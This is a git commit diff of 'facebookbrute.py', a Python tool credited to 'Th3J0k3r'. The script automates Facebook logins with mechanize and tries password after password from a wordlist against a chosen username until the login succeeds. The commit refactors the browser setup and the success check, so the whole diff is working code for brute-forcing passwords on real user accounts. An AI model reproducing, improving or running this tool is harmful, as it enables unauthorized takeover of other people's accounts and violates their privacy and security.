849c324a4018c765792fa3f8ade0ae6d8671bae1
Th3J0k3r <33673319+ethicalhackingplayground@users.noreply.github.com>
2017-11-15 05:54:05 -0500

    Update facebookbrute.py

--- facebookbrute.py
+++ facebookbrute.py
@@ -6,8 +6,8 @@ import mechanize
 import time
 import os
 import ConfigParser
-from pathlib import Path
 from multiprocessing import Process
+from pathlib import Path
 from bs4 import BeautifulSoup
 from lazyme.string import color_print
 
@@ -15,16 +15,16 @@ from lazyme.string import color_print
 def def_banner():
 
 	os.system('clear')
-	color_print(" ______             _                 _    ____             _", color='red')       
- 	color_print("|  ____|           | |               | |  |  _ \           | |",color='red')  
- 	color_print("| |__ __ _  ___ ___| |__   ___   ___ | | _| |_) |_ __ _   _| |_ ___", color='red')
-	color_print("|  __/ _` |/ __/ _ | '_ \ / _ \ / _ \| |/ |  _ <| '__| | | | __/ _ \ ", color='red')
- 	color_print("| | | (_| | (_|  __| |_) | (_) | (_) |   <| |_) | |  | |_| | ||  __/ ", color='red')
- 	color_print("|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_|____/|_|   \__,_|\__\___| ", color='red')
+	color_print(" ______             _                 _    ____             _", color='green')       
+ 	color_print("|  ____|           | |               | |  |  _ \           | |",color='green')  
+ 	color_print("| |__ __ _  ___ ___| |__   ___   ___ | | _| |_) |_ __ _   _| |_ ___", color='green')
+	color_print("|  __/ _` |/ __/ _ | '_ \ / _ \ / _ \| |/ |  _ <| '__| | | | __/ _ \ ", color='green')
+ 	color_print("| | | (_| | (_|  __| |_) | (_) | (_) |   <| |_) | |  | |_| | ||  __/ ", color='green')
+ 	color_print("|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_|____/|_|   \__,_|\__\___| ", color='green')
                                                                      
 
 
-	color_print("			Created By Th3J0k3r", color='red')
+	color_print("			Created By Th3J0k3r", color='green')
 
 # Read in the config file.
 def def_config ():
@@ -39,38 +39,48 @@ def def_config ():
 	dic_path = configParser.get('Config','dict')
 	username = configParser.get('Config', 'user')
 	if (Path(dic_path).is_file() == False):
-		color_print("\n\n[!] The wordlist does not extist", color='red')
-		return 1
+		color_print("\n\n[!] The wordlist does not exist", color='red')
+		return
 	if username == 'username' and dic_path == 'wordlist':
 		color_print("\n\n[!] You need to setup the config file", color='red')
-		return 1
+		return
 
 	else:
-		def_parrell(def_login)
+		def_setup()
+		def_process(def_login())
 
-def def_parrell(f):
+# Setup the browser
+def def_setup():
+	# Set the socket timeout.
+	#mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 100
+
+	# Setup Mechanize
+	global browser
+	browser = mechanize.Browser()
+	browser.set_handle_robots(False)
+	cookies = mechanize.CookieJar()
+	browser.set_cookiejar(cookies)
+	browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
+	browser.set_handle_refresh(True)
+	browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+		
+	isDebugging = configParser.get('Config', 'debug')
+	if isDebugging == 'True':
+		# Want debugging messages?
+		browser.set_debug_http(True)
+		browser.set_debug_redirects(True)
+		browser.set_debug_responses(True)
+
+	url = 'http://www.facebook.com/login.php'
+	browser.open(url)
+	browser.select_form(nr = 0)
+
+def def_process (f):
 	p = Process(target=f)
 	p.start()
 
 # Crack the password.
 def def_login():
-
-	# Set the socket timeout.
-	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 100
-
-	# Setup Mechanize
-	global  browser
-	browser = mechanize.Browser()
-	browser.set_handle_robots(False)
-	browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-	cookies = mechanize.CookieJar()
-	browser.set_cookiejar(cookies)
-	browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
-	browser.set_handle_refresh(True)
-
-	url = 'http://www.facebook.com/login.php'
-	browser.open(url)
-	browser.select_form(nr = 0)
 
 	global request
 	# read in the username from the config file.
@@ -86,17 +96,18 @@ def def_login():
 			request = browser.submit()
 			# Declare a BeautifulSoup Object.
 			soup = BeautifulSoup(request, 'html.parser')
-
 			# Attempt to brute force the password.
-			try:
+			title = soup.title.string
+			if title != 'Facebook':
 
 				action = soup.find('form', id='login_form').get('action')
 				color_print(action, color='red')
 				print("[!] Wrong password")
 				browser.select_form(nr = 0)
 	       			line = fp.readline()
+
 				continue	
-			except AttributeError:
+			else:
 
 				# Password found, Yey!!
 				username = configParser.get('Config', 'user')	
@@ -110,9 +121,7 @@ def def_login():
 
 			browser.select_form(nr = 0)
 	       		line = fp.readline()
-		time.sleep(0.0001)
-	time.sleep(0.0001)
-
+			continue
 # call the methods.
 def_banner()
 def_config()
